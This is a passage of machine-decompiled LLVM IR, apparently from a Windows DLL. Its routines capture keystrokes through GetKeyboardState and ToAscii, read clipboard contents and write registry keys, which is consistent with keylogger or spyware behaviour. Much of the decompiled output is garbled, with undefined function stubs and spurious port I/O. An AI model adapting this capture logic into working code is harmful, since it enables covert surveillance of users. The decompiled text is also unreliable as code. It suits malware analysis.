  store i8* inttoptr (i32 101 to i8*), i8** %stack_var_-132, align 4, !insn.addr !813
  %4 = bitcast i8** %stack_var_-132 to i32*, !insn.addr !814
  %5 = call i32 @function_404394(i32 101, i32* nonnull %4, i32* nonnull %stack_var_-128, i32* nonnull @global_var_408104, i32 0, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_40530c, i32 0, i32 0), i32 -2147483647), !insn.addr !814
  %6 = icmp eq i32 %5, 0, !insn.addr !815
  %7 = icmp eq i1 %6, false, !insn.addr !816
  br i1 %7, label %dec_label_pc_4052d5, label %dec_label_pc_4052c5, !insn.addr !816

dec_label_pc_4052c5:                              ; preds = %dec_label_pc_405299
  %8 = call i32 @"@LStrFromArray"(), !insn.addr !817
  br label %dec_label_pc_4052d5, !insn.addr !817

dec_label_pc_4052d5:                              ; preds = %dec_label_pc_4052c5, %dec_label_pc_405299
  %9 = call i32 @function_404374(), !insn.addr !818
  store i32 %9, i32* %eax.0.reg2mem, !insn.addr !818
  br label %dec_label_pc_4052de, !insn.addr !818

dec_label_pc_4052de:                              ; preds = %dec_label_pc_4052d5, %dec_label_pc_405264
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !819
}

define i32 @function_4052e7(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_4052e7:
  %esp.1.reg2mem = alloca i32, !insn.addr !820
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !820
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_24, align 4
  %5 = add i32 %3, 1, !insn.addr !820
  %6 = inttoptr i32 %3 to i32*, !insn.addr !820
  store i32 %5, i32* %6, align 4, !insn.addr !820
  %7 = bitcast i32* %eax to i8*
  %8 = load i8, i8* %7, align 4, !insn.addr !821
  %9 = load i32, i32* %eax, align 4
  %10 = trunc i32 %9 to i8, !insn.addr !821
  %11 = add i8 %8, %10, !insn.addr !821
  %12 = inttoptr i32 %9 to i8*, !insn.addr !821
  store i8 %11, i8* %12, align 1, !insn.addr !821
  %13 = add i32 %1, 122, !insn.addr !822
  %14 = inttoptr i32 %13 to i8*, !insn.addr !822
  %15 = load i8, i8* %14, align 1, !insn.addr !822
  %16 = udiv i32 %4, 256, !insn.addr !822
  %17 = trunc i32 %16 to i8, !insn.addr !822
  %18 = add i8 %15, %17, !insn.addr !822
  store i8 %18, i8* %14, align 1, !insn.addr !822
  %19 = load i8, i8* %7, align 4, !insn.addr !823
  %20 = load i32, i32* %eax, align 4, !insn.addr !823
  %21 = trunc i32 %20 to i8, !insn.addr !823
  %22 = add i8 %19, %21, !insn.addr !823
  %23 = icmp eq i8 %22, 0, !insn.addr !823
  %24 = inttoptr i32 %20 to i8*, !insn.addr !823
  store i8 %22, i8* %24, align 1, !insn.addr !823
  %25 = trunc i32 %3 to i16, !insn.addr !824
  call void @__asm_outsd(i16 %25, i32 %0), !insn.addr !824
  br i1 %23, label %26, label %dec_label_pc_4052f5, !insn.addr !825

; <label>:26:                                     ; preds = %dec_label_pc_4052e7
  %27 = call i32 @unknown_536c(), !insn.addr !825
  br label %dec_label_pc_4052f5, !insn.addr !825

dec_label_pc_4052f5:                              ; preds = %26, %dec_label_pc_4052e7
  %28 = icmp ult i8 %22, %19, !insn.addr !823
  %29 = load i32, i32* %stack_var_24, align 4, !insn.addr !826
  store i32 %29, i32* %eax, align 4, !insn.addr !826
  br i1 %28, label %dec_label_pc_40535d, label %dec_label_pc_4052f8, !insn.addr !827

dec_label_pc_4052f8:                              ; preds = %dec_label_pc_4052f5
  %30 = call i8 @llvm.ctpop.i8(i8 %22), !range !351, !insn.addr !823
  %31 = and i8 %30, 1, !insn.addr !823
  %32 = icmp eq i8 %31, 0, !insn.addr !823
  %33 = trunc i32 %arg4 to i16, !insn.addr !828
  %34 = call i32 @__asm_insd(i16 %33), !insn.addr !828
  %35 = inttoptr i32 %2 to i32*, !insn.addr !828
  store i32 %34, i32* %35, align 4, !insn.addr !828
  br i1 %32, label %dec_label_pc_405358, label %dec_label_pc_4052fc, !insn.addr !829

dec_label_pc_4052fc:                              ; preds = %dec_label_pc_4052f8
  store i32 %arg3, i32* %stack_var_28, align 4, !insn.addr !830
  store i32 %arg3, i32* %stack_var_24, align 4, !insn.addr !831
  %36 = add i32 %arg4, 1, !insn.addr !832
  %37 = icmp eq i32 %36, 0, !insn.addr !832
  store i32* %stack_var_24, i32** %esp.0.in.reg2mem, !insn.addr !833
  br i1 %37, label %dec_label_pc_405363, label %dec_label_pc_405302, !insn.addr !833

dec_label_pc_405302:                              ; preds = %dec_label_pc_4052fc
  %38 = load i32, i32* %eax, align 4, !insn.addr !834
  %39 = add i32 %38, -1, !insn.addr !834
  store i32 %39, i32* %eax, align 4, !insn.addr !834
  %40 = trunc i32 %36 to i16, !insn.addr !835
  %41 = inttoptr i32 %arg7 to i32*, !insn.addr !835
  %42 = load i32, i32* %41, align 4, !insn.addr !835
  call void @__asm_outsd(i16 %40, i32 %42), !insn.addr !835
  %43 = load i32, i32* %41, align 4, !insn.addr !836
  call void @__asm_outsd(i16 %40, i32 %43), !insn.addr !836
  %44 = add i32 %arg7, 105, !insn.addr !837
  %45 = inttoptr i32 %44 to i8*, !insn.addr !837
  %46 = load i8, i8* %45, align 1, !insn.addr !837
  %47 = trunc i32 %39 to i8, !insn.addr !837
  %48 = add i8 %46, %47, !insn.addr !837
  %49 = icmp ult i8 %48, %46, !insn.addr !837
  store i8 %48, i8* %45, align 1, !insn.addr !837
  store i32 0, i32* %esp.1.reg2mem, !insn.addr !838
  br i1 %49, label %dec_label_pc_405383, label %dec_label_pc_405310, !insn.addr !838

dec_label_pc_405310:                              ; preds = %dec_label_pc_405302
  %50 = icmp eq i8 %48, 0, !insn.addr !837
  br i1 %50, label %dec_label_pc_405332, label %dec_label_pc_405312, !insn.addr !839

dec_label_pc_405312:                              ; preds = %dec_label_pc_405310
  store i32 %36, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !840
  store i32 -4, i32* %esp.1.reg2mem
  br label %dec_label_pc_405383

dec_label_pc_405332:                              ; preds = %dec_label_pc_405310
  %51 = load i32, i32* %eax, align 4
  %52 = inttoptr i32 %51 to i32*, !insn.addr !841
  %53 = load i32, i32* %52, align 4, !insn.addr !841
  store i32 %53, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !841
  call void @__writefsdword(i32 %51, i32 -4), !insn.addr !842
  store i32 ptrtoint ([27 x i8]* @global_var_4053c8 to i32), i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !843
  store i32 -2147483647, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !844
  %54 = call i32 @RegDeleteKeyA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !845
  %55 = add i32 %arg6, -8, !insn.addr !846
  %56 = inttoptr i32 %55 to i32*, !insn.addr !846
  store i32 0, i32* %56, align 4, !insn.addr !846
  %57 = add i32 %arg6, -12, !insn.addr !847
  %58 = inttoptr i32 %57 to i32*, !insn.addr !847
  store i32 1, i32* %58, align 4, !insn.addr !847
  store i32 %57, i32* inttoptr (i32 -16 to i32*), align 16, !insn.addr !848
  ret i32 %57, !insn.addr !848

dec_label_pc_405358:                              ; preds = %dec_label_pc_4052f8
  %59 = load i32, i32* %eax, align 4
  ret i32 %59, !insn.addr !849

dec_label_pc_40535d:                              ; preds = %dec_label_pc_4052f5
  %60 = trunc i32 %2 to i8
  %61 = trunc i32 %arg3 to i8, !insn.addr !850
  %62 = add i8 %60, %61, !insn.addr !850
  %63 = inttoptr i32 %2 to i8*, !insn.addr !850
  store i8 %62, i8* %63, align 1, !insn.addr !850
  %64 = inttoptr i32 %arg4 to i8*, !insn.addr !851
  %65 = load i8, i8* %64, align 1, !insn.addr !851
  %66 = udiv i32 %arg3, 256, !insn.addr !851
  %67 = trunc i32 %66 to i8, !insn.addr !851
  %68 = add i8 %65, %67, !insn.addr !851
  store i8 %68, i8* %64, align 1, !insn.addr !851
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !851
  br label %dec_label_pc_405363, !insn.addr !851

dec_label_pc_405363:                              ; preds = %dec_label_pc_40535d, %dec_label_pc_4052fc
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %69 = add i32 %esp.0, -4, !insn.addr !852
  %70 = inttoptr i32 %69 to i32*, !insn.addr !852
  store i32 0, i32* %70, align 4, !insn.addr !852
  %71 = add i32 %esp.0, -8, !insn.addr !853
  %72 = inttoptr i32 %71 to i32*, !insn.addr !853
  store i32 0, i32* %72, align 4, !insn.addr !853
  %73 = add i32 %esp.0, -12, !insn.addr !854
  %74 = inttoptr i32 %73 to i32*, !insn.addr !854
  store i32 ptrtoint ([27 x i8]* @global_var_4053c8 to i32), i32* %74, align 4, !insn.addr !854
  %75 = add i32 %esp.0, -16, !insn.addr !855
  %76 = inttoptr i32 %75 to i32*, !insn.addr !855
  store i32 -2147483647, i32* %76, align 4, !insn.addr !855
  %77 = call i32 @RegCreateKeyExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32** bitcast (i32* @0 to i32**), i32* nonnull @0), !insn.addr !856
  %78 = call i32 @function_4034c8(), !insn.addr !857
  %79 = add i32 %78, 1, !insn.addr !858
  %80 = add i32 %esp.0, -20, !insn.addr !859
  %81 = inttoptr i32 %80 to i32*, !insn.addr !859
  store i32 %79, i32* %81, align 4, !insn.addr !859
  store i32 %80, i32* %esp.1.reg2mem, !insn.addr !860
  br label %dec_label_pc_405383, !insn.addr !860

dec_label_pc_405383:                              ; preds = %dec_label_pc_405312, %dec_label_pc_405363, %dec_label_pc_405302
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %82 = call i32 @function_4036c8(), !insn.addr !861
  %83 = add i32 %esp.1.reload, -4, !insn.addr !862
  %84 = inttoptr i32 %83 to i32*, !insn.addr !862
  store i32 %82, i32* %84, align 4, !insn.addr !862
  %85 = add i32 %esp.1.reload, -8, !insn.addr !863
  %86 = inttoptr i32 %85 to i32*, !insn.addr !863
  store i32 1, i32* %86, align 4, !insn.addr !863
  %87 = add i32 %esp.1.reload, -12, !insn.addr !864
  %88 = inttoptr i32 %87 to i32*, !insn.addr !864
  store i32 0, i32* %88, align 4, !insn.addr !864
  %89 = add i32 %esp.1.reload, -16, !insn.addr !865
  %90 = inttoptr i32 %89 to i32*, !insn.addr !865
  store i32 ptrtoint ([10 x i8]* @global_var_4053e4 to i32), i32* %90, align 4, !insn.addr !865
  %91 = add i32 %arg6, -8, !insn.addr !866
  %92 = inttoptr i32 %91 to i32*, !insn.addr !866
  %93 = load i32, i32* %92, align 4, !insn.addr !866
  %94 = add i32 %esp.1.reload, -20, !insn.addr !867
  %95 = inttoptr i32 %94 to i32*, !insn.addr !867
  store i32 %93, i32* %95, align 4, !insn.addr !867
  %96 = call i32 @RegSetValueExA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !868
  %97 = load i32, i32* %92, align 4, !insn.addr !869
  %98 = add i32 %esp.1.reload, -24, !insn.addr !870
  %99 = inttoptr i32 %98 to i32*, !insn.addr !870
  store i32 %97, i32* %99, align 4, !insn.addr !870
  %100 = call i32 @function_404374(), !insn.addr !871
  %101 = load i32, i32* %99, align 4, !insn.addr !872
  call void @__writefsdword(i32 0, i32 %101), !insn.addr !873
  store i32 4215745, i32* %90, align 4, !insn.addr !874
  %102 = call i32 @"@LStrClr"(), !insn.addr !875
  ret i32 %102, !insn.addr !876
}

define i32 @function_4053ba() local_unnamed_addr {
dec_label_pc_4053ba:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !877
  ret i32 %0, !insn.addr !877
}

define i32 @function_4053bf() local_unnamed_addr {
dec_label_pc_4053bf:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !878
}

define i32 @function_4053c1() local_unnamed_addr {
dec_label_pc_4053c1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !879
}

define i32 @function_4053c5(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_4053c5:
  %.reg2mem = alloca i32, !insn.addr !880
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !880
  %5 = inttoptr i32 %2 to i8*, !insn.addr !880
  store i8 %4, i8* %5, align 1, !insn.addr !880
  %6 = add i32 %0, 111, !insn.addr !881
  %7 = inttoptr i32 %6 to i8*, !insn.addr !881
  %8 = load i8, i8* %7, align 1, !insn.addr !881
  %9 = trunc i32 %1 to i8, !insn.addr !881
  %10 = add i8 %8, %9, !insn.addr !881
  %11 = icmp eq i8 %10, 0, !insn.addr !881
  store i8 %10, i8* %7, align 1, !insn.addr !881
  br i1 %11, label %12, label %dec_label_pc_4053cd, !insn.addr !882

; <label>:12:                                     ; preds = %dec_label_pc_4053c5
  %13 = call i32 @unknown_5444(), !insn.addr !882
  br label %dec_label_pc_4053cd, !insn.addr !882

dec_label_pc_4053cd:                              ; preds = %12, %dec_label_pc_4053c5
  %14 = icmp ult i8 %10, %8, !insn.addr !881
  br i1 %14, label %dec_label_pc_405435, label %dec_label_pc_4053d0, !insn.addr !883

dec_label_pc_4053d0:                              ; preds = %dec_label_pc_4053cd
  %15 = call i8 @llvm.ctpop.i8(i8 %10), !range !351, !insn.addr !881
  %16 = and i8 %15, 1, !insn.addr !881
  %17 = icmp eq i8 %16, 0, !insn.addr !881
  %18 = trunc i32 %arg4 to i16, !insn.addr !884
  %19 = call i32 @__asm_insd(i16 %18), !insn.addr !884
  %20 = inttoptr i32 %arg8 to i32*, !insn.addr !884
  store i32 %19, i32* %20, align 4, !insn.addr !884
  br i1 %17, label %dec_label_pc_405430, label %dec_label_pc_4053d4, !insn.addr !885

dec_label_pc_4053d4:                              ; preds = %dec_label_pc_4053d0
  %21 = add i32 %arg4, 1, !insn.addr !886
  %22 = icmp eq i32 %21, 0, !insn.addr !886
  store i32 %arg2, i32* %.reg2mem, !insn.addr !887
  br i1 %22, label %dec_label_pc_40543b, label %dec_label_pc_4053da, !insn.addr !887

dec_label_pc_4053da:                              ; preds = %dec_label_pc_4053d4
  %23 = add i32 %arg2, -1, !insn.addr !888
  %24 = trunc i32 %21 to i16, !insn.addr !889
  %25 = inttoptr i32 %arg7 to i32*, !insn.addr !889
  %26 = load i32, i32* %25, align 4, !insn.addr !889
  call void @__asm_outsd(i16 %24, i32 %26), !insn.addr !889
  %27 = load i32, i32* %25, align 4, !insn.addr !890
  call void @__asm_outsd(i16 %24, i32 %27), !insn.addr !890
  %28 = add i32 %arg7, 105, !insn.addr !891
  %29 = inttoptr i32 %28 to i8*, !insn.addr !891
  %30 = load i8, i8* %29, align 1, !insn.addr !891
  %31 = trunc i32 %23 to i8, !insn.addr !891
  %32 = add i8 %30, %31, !insn.addr !891
  %33 = icmp eq i8 %32, 0, !insn.addr !891
  store i8 %32, i8* %29, align 1, !insn.addr !891
  br i1 %33, label %dec_label_pc_40540a, label %dec_label_pc_4053ea, !insn.addr !892

dec_label_pc_4053ea:                              ; preds = %dec_label_pc_4053da
  store i32 %21, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !893
  %34 = inttoptr i32 %23 to i8*, !insn.addr !894
  %35 = load i8, i8* %34, align 1, !insn.addr !894
  %36 = add i8 %35, %31, !insn.addr !894
  store i8 %36, i8* %34, align 1, !insn.addr !894
  %37 = add i32 %arg5, 86, !insn.addr !895
  %38 = inttoptr i32 %37 to i8*, !insn.addr !895
  %39 = load i8, i8* %38, align 1, !insn.addr !895
  %40 = trunc i32 %21 to i8, !insn.addr !895
  %41 = add i8 %39, %40, !insn.addr !895
  store i8 %41, i8* %38, align 1, !insn.addr !895
  store i32 %arg8, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !896
  %42 = call i32 @"@LStrClr"(), !insn.addr !897
  store i32 0, i32* inttoptr (i32 -12 to i32*), align 4, !insn.addr !898
  %43 = call i1 @OpenClipboard(i32* nonnull @0), !insn.addr !899
  %44 = zext i1 %43 to i32, !insn.addr !900
  ret i32 %44, !insn.addr !900

dec_label_pc_40540a:                              ; preds = %dec_label_pc_4053da
  %factor = mul i32 %arg6, 2
  %45 = add i32 %factor, 106, !insn.addr !901
  %46 = inttoptr i32 %45 to i8*, !insn.addr !901
  %47 = load i8, i8* %46, align 2, !insn.addr !901
  %48 = mul i8 %47, 2, !insn.addr !901
  store i8 %48, i8* %46, align 2, !insn.addr !901
  %49 = call i32* @GetClipboardData(i32 ptrtoint (i32* @0 to i32)), !insn.addr !902
  %50 = icmp eq i32* %49, null, !insn.addr !903
  br i1 %50, label %dec_label_pc_405435, label %dec_label_pc_40541a, !insn.addr !904

dec_label_pc_40541a:                              ; preds = %dec_label_pc_40540a
  %51 = ptrtoint i32* %49 to i32, !insn.addr !902
  store i32 %51, i32* inttoptr (i32 -4 to i32*), align 4, !insn.addr !905
  %52 = call i32* @GlobalLock(i32* nonnull @0), !insn.addr !906
  %53 = icmp eq i32* %52, null, !insn.addr !907
  br i1 %53, label %dec_label_pc_405435, label %dec_label_pc_405426, !insn.addr !908

dec_label_pc_405426:                              ; preds = %dec_label_pc_40541a
  %54 = call i32 @"@LStrFromPChar"(), !insn.addr !909
  store i32 %51, i32* inttoptr (i32 -8 to i32*), align 8, !insn.addr !910
  br label %dec_label_pc_405430, !insn.addr !910

dec_label_pc_405430:                              ; preds = %dec_label_pc_405426, %dec_label_pc_4053d0
  %55 = call i1 @GlobalUnlock(i32* nonnull @0), !insn.addr !911
  br label %dec_label_pc_405435, !insn.addr !911

dec_label_pc_405435:                              ; preds = %dec_label_pc_405430, %dec_label_pc_40541a, %dec_label_pc_40540a, %dec_label_pc_4053cd
  %56 = call i1 @CloseClipboard(), !insn.addr !912
  %57 = sext i1 %56 to i32, !insn.addr !912
  store i32 %57, i32* %.reg2mem, !insn.addr !913
  br label %dec_label_pc_40543b, !insn.addr !913

dec_label_pc_40543b:                              ; preds = %dec_label_pc_4053d4, %dec_label_pc_405435
  %.reload = load i32, i32* %.reg2mem, !insn.addr !914
  ret i32 %.reload, !insn.addr !914
}

define i32 @DllGetClassObject(i32 %arg1) local_unnamed_addr {
dec_label_pc_405440:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i8*, align 4
  %2 = inttoptr i32 %1 to i8*, !insn.addr !915
  store i8* %2, i8** %stack_var_-8, align 4, !insn.addr !915
  %3 = load i32, i32* inttoptr (i32 4227384 to i32*), align 8, !insn.addr !916
  %4 = inttoptr i32 %3 to i32*, !insn.addr !917
  %5 = load i32, i32* %4, align 4, !insn.addr !917
  %6 = icmp eq i32 %5, 0, !insn.addr !917
  %7 = icmp eq i1 %6, false, !insn.addr !918
  %8 = icmp eq i1 %7, false, !insn.addr !919
  br i1 %8, label %dec_label_pc_40547c, label %dec_label_pc_405453, !insn.addr !919

dec_label_pc_405453:                              ; preds = %dec_label_pc_405440
  %9 = inttoptr i32 %0 to i8*, !insn.addr !920
  %10 = call i32* @FindWindowA(i8* %9, i8* %2), !insn.addr !921
  %11 = icmp eq i32* %10, null, !insn.addr !922
  %12 = icmp eq i1 %11, false, !insn.addr !923
  br i1 %12, label %dec_label_pc_40547c, label %dec_label_pc_405466, !insn.addr !923

dec_label_pc_405466:                              ; preds = %dec_label_pc_405453
  %13 = bitcast i8** %stack_var_-8 to %_SECURITY_ATTRIBUTES*
  %14 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* nonnull %13, i32 0, i32 (i32*)* inttoptr (i32 66 to i32 (i32*)*), i32* inttoptr (i32 4222104 to i32*), i32 0, i32* null), !insn.addr !924
  br label %dec_label_pc_40547c, !insn.addr !924

dec_label_pc_40547c:                              ; preds = %dec_label_pc_405466, %dec_label_pc_405453, %dec_label_pc_405440
  %15 = inttoptr i32 %arg1 to i32*, !insn.addr !925
  store i32 0, i32* %15, align 4, !insn.addr !925
  ret i32 -2147221231, !insn.addr !926
}

define i32 @DllCanUnloadNow() local_unnamed_addr {
dec_label_pc_4054a8:
  ret i32 0, !insn.addr !927
}

define i32 @DllRegisterServer() local_unnamed_addr {
dec_label_pc_4054ac:
  ret i32 0, !insn.addr !928
}

define i32 @DllUnregisterServer() local_unnamed_addr {
dec_label_pc_4054b0:
  ret i32 0, !insn.addr !929
}

define i32 @function_4054b4() local_unnamed_addr {
dec_label_pc_4054b4:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !930
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !930
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !930
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !931
  %2 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !932
  %3 = add i32 %2, 1, !insn.addr !932
  store i32 %3, i32* @global_var_4096b0, align 4, !insn.addr !932
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !933
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !934
  ret i32 0, !insn.addr !935
}

define i32 @function_4054d9() local_unnamed_addr {
dec_label_pc_4054d9:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !936
  ret i32 %0, !insn.addr !936
}

define i32 @function_4054de() local_unnamed_addr {
dec_label_pc_4054de:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !937
}

define i32 @function_4054e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_4054e0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !938
}

define i32 @function_4054e4() local_unnamed_addr {
dec_label_pc_4054e4:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096b0, align 4, !insn.addr !939
  %2 = add i32 %1, -1, !insn.addr !939
  store i32 %2, i32* @global_var_4096b0, align 4, !insn.addr !939
  ret i32 %0, !insn.addr !940
}

define i32 @function_4054ec(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4054ec:
  %esp.0.reg2mem = alloca i32, !insn.addr !941
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !942
  store i32 %2, i32* %stack_var_-292, align 4, !insn.addr !942
  %3 = ptrtoint i32* %stack_var_-292 to i32, !insn.addr !942
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !943
  %4 = call i32 @function_40777c(), !insn.addr !944
  %5 = icmp ne i32 %4, 0, !insn.addr !945
  %6 = icmp eq i1 %5, false, !insn.addr !946
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !947
  br i1 %6, label %dec_label_pc_4055e7, label %dec_label_pc_405529, !insn.addr !947

dec_label_pc_405529:                              ; preds = %dec_label_pc_4054ec
  switch i32 %0, label %dec_label_pc_405573 [
    i32 8, label %dec_label_pc_405537
    i32 46, label %dec_label_pc_405556
  ]

dec_label_pc_405537:                              ; preds = %dec_label_pc_405529
  %7 = call i32 @function_407818(), !insn.addr !948
  %8 = call i32 @"@LStrDelete"(), !insn.addr !949
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !950
  br label %dec_label_pc_4055e7, !insn.addr !950

dec_label_pc_405556:                              ; preds = %dec_label_pc_405529
  %9 = call i32 @function_407818(), !insn.addr !951
  %10 = call i32 @"@LStrDelete"(), !insn.addr !952
  store i32 %3, i32* %esp.0.reg2mem, !insn.addr !953
  br label %dec_label_pc_4055e7, !insn.addr !953

dec_label_pc_405573:                              ; preds = %dec_label_pc_405529
  %11 = bitcast i32* %stack_var_-264 to i8*
  %12 = call i1 @GetKeyboardState(i8* nonnull %11), !insn.addr !954
  %13 = ptrtoint i32* %stack_var_-8 to i32, !insn.addr !955
  %14 = udiv i32 %1, 65536, !insn.addr !956
  %15 = and i32 %14, 255, !insn.addr !957
  %16 = inttoptr i32 %15 to i16*, !insn.addr !958
  %17 = ptrtoint i32* %stack_var_-316 to i32, !insn.addr !959
  %18 = call i32 @ToAscii(i32 0, i32 %13, i8* nonnull %11, i16* %16, i32 %0), !insn.addr !960
  %19 = icmp eq i32 %18, 1, !insn.addr !961
  %20 = icmp eq i1 %19, false, !insn.addr !962
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !962
  br i1 %20, label %dec_label_pc_4055e7, label %dec_label_pc_40559f, !insn.addr !962

dec_label_pc_40559f:                              ; preds = %dec_label_pc_405573
  %21 = call i32 @function_4074e0(), !insn.addr !963
  %22 = icmp eq i32 %21, 0, !insn.addr !964
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !965
  br i1 %22, label %dec_label_pc_4055e7, label %dec_label_pc_4055ab, !insn.addr !965

dec_label_pc_4055ab:                              ; preds = %dec_label_pc_40559f
  %23 = call i32 @function_4034c8(), !insn.addr !966
  %24 = icmp sgt i32 %23, 15, !insn.addr !967
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !967
  br i1 %24, label %dec_label_pc_4055e7, label %dec_label_pc_4055bc, !insn.addr !967

dec_label_pc_4055bc:                              ; preds = %dec_label_pc_4055ab
  %25 = call i32 @function_407818(), !insn.addr !968
  %26 = call i32 @"@LStrFromChar"(), !insn.addr !969
  %27 = call i32 @"@LStrInsert"(), !insn.addr !970
  store i32 %17, i32* %esp.0.reg2mem, !insn.addr !970
  br label %dec_label_pc_4055e7, !insn.addr !970

dec_label_pc_4055e7:                              ; preds = %dec_label_pc_4055bc, %dec_label_pc_4055ab, %dec_label_pc_40559f, %dec_label_pc_405573, %dec_label_pc_405556, %dec_label_pc_405537, %dec_label_pc_4054ec
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %28 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !971
  %29 = load i32, i32* %28, align 4, !insn.addr !971
  call void @__writefsdword(i32 0, i32 %29), !insn.addr !972
  %30 = add i32 %esp.0.reload, 8, !insn.addr !973
  %31 = inttoptr i32 %30 to i32*, !insn.addr !973
  store i32 4216327, i32* %31, align 4, !insn.addr !973
  %32 = call i32 @"@LStrClr"(), !insn.addr !974
  ret i32 %32, !insn.addr !975
}

define i32 @function_405600() local_unnamed_addr {
dec_label_pc_405600:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !976
  ret i32 %0, !insn.addr !976
}

define i32 @function_405605() local_unnamed_addr {
dec_label_pc_405605:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !977
}

define i32 @function_405607(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405607:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !978
}

define i32 @function_405610(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405610:
  %stack_var_-32 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !979
  store i32 %0, i32* %stack_var_-32, align 4, !insn.addr !979
  %1 = ptrtoint i32* %stack_var_-32 to i32, !insn.addr !979
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !980
  %2 = call i32 @function_40777c(), !insn.addr !981
  %3 = load i32, i32* %stack_var_-32, align 4, !insn.addr !982
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !983
  %4 = add i32 %1, 8, !insn.addr !984
  %5 = inttoptr i32 %4 to i32*, !insn.addr !984
  store i32 4216534, i32* %5, align 4, !insn.addr !984
  %6 = call i32 @"@LStrArrayClr"(), !insn.addr !985
  ret i32 %6, !insn.addr !986
}

define i32 @function_4056cf() local_unnamed_addr {
dec_label_pc_4056cf:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !987
  ret i32 %0, !insn.addr !987
}

define i32 @function_4056d4() local_unnamed_addr {
dec_label_pc_4056d4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !988
}

define i32 @function_4056d6(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4056d6:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !989
}

define i32 @function_4056dc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_4056dc:
  %esp.0.reg2mem = alloca i32, !insn.addr !990
  %0 = call i32 @__decompiler_undefined_function_0()
